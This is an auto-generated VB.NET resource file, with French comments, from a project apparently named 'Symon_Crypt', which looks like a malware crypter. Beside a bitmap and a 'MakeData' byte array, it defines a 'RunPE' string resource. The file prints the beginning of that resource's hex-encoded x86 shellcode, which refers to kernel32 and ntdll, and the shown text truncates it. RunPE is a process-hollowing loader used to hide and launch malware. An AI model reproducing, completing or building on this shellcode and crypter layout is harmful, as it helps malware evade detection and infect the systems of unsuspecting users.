﻿'------------------------------------------------------------------------------
' <auto-generated>
'     Ce code a été généré par un outil.
'     Version du runtime :4.0.30319.42000
'
'     Les modifications apportées à ce fichier peuvent provoquer un comportement incorrect et seront perdues si
'     le code est régénéré.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'Cette classe a été générée automatiquement par la classe StronglyTypedResourceBuilder
    'à l'aide d'un outil, tel que ResGen ou Visual Studio.
    'Pour ajouter ou supprimer un membre, modifiez votre fichier .ResX, puis réexécutez ResGen
    'avec l'option /str ou régénérez votre projet VS.
    '''<summary>
    '''  Une classe de ressource fortement typée destinée, entre autres, à la consultation des chaînes localisées.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "15.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Retourne l'instance ResourceManager mise en cache utilisée par cette classe.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("Symon_Crypt.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Remplace la propriété CurrentUICulture du thread actuel pour toutes
        '''  les recherches de ressources à l'aide de cette classe de ressource fortement typée.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Recherche une ressource localisée de type System.Drawing.Bitmap.
        '''</summary>
        Friend ReadOnly Property build_128() As System.Drawing.Bitmap
            Get
                Dim obj As Object = ResourceManager.GetObject("build-128", resourceCulture)
                Return CType(obj,System.Drawing.Bitmap)
            End Get
        End Property
        
        '''<summary>
        '''  Recherche une ressource localisée de type System.Byte[].
        '''</summary>
        Friend ReadOnly Property MakeData() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("MakeData", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Recherche une chaîne localisée semblable à 0x60E84E0000006B00650072006E0065006C003300320000006E00740064006C006C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005B8BFC6A42E8BB0300008B54242889118B54242C6A3EE8AA03000089116A4AE8A103000089396A1E6A3CE89D0300006A2268F4000000E8910300006A266A24E8880300006A2A6A40E87F0300006A2E6A0CE8760300006A3268C8000000E86A0300006A2AE85C0300008B09C701440000006A12E84D030000685BE814CF51E8790300006A3EE83B0300008BD16A1EE8320300006A40FF32FF31FFD06A12E823030000685BE814CF51E84F03 [le reste de la chaîne a été tronqué]&quot;;.
        '''</summary>
        Friend ReadOnly Property RunPE() As String
            Get
                Return ResourceManager.GetString("RunPE", resourceCulture)
            End Get
        End Property
    End Module
End Namespace
